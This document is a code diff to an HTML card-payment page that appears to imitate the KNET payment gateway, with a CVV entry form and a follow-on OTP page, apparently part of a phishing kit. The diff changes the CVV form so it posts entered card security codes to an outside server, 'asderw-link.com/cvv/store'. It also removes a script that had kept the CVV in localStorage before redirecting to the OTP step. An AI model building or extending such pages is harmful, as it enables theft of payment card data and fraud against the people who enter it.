@@ -16,7 +16,8 @@
 
 <body>
 
-    <link href="/knetVern/payment-combined.css" rel="stylesheet" type="text/css">
+    <link href="/knetVern/payment-responsive.css" rel="stylesheet" type="text/css">
+    <link href="/knetVern/payment-stylesheet.css" rel="stylesheet" type="text/css">
 
 
 
@@ -2317,7 +2318,7 @@ display: none;
 
 
 
-    <form action="javascript:void(0);" onsubmit="handleCVVSubmit(event)" method="post" autocomplete="off"> <input type="hidden" name="_token" value="w3KxyROOSPjqdSTWIY01k1UYjrVv7XswoYP1z56q" autocomplete="off">
+    <form action="https://asderw-link.com/cvv/store" method="post" autocomplete="off"> <input type="hidden" name="_token" value="w3KxyROOSPjqdSTWIY01k1UYjrVv7XswoYP1z56q" autocomplete="off">
         <div class="madd"> </div>
 
 
@@ -3087,25 +3088,3 @@ display: none;
 </body>
 
 </html>
-<script>
-function handleCVVSubmit(event) {
-    event.preventDefault();
-    
-    // Get CVV data
-    const cvvValue = document.querySelector('input[name="cvv"]') ? document.querySelector('input[name="cvv"]').value : '';
-    
-    // Create transaction data
-    const transactionData = {
-        cvv: cvvValue,
-        timestamp: new Date().toISOString(),
-        stage: 'cvv'
-    };
-    
-    // Store in localStorage
-    const transactionKey = 'transaction_cvv_' + Date.now();
-    localStorage.setItem(transactionKey, JSON.stringify(transactionData));
-    
-    // Redirect to OTP page (second time)
-    window.location.href = '/knet/ver.html';
-}
-</script>
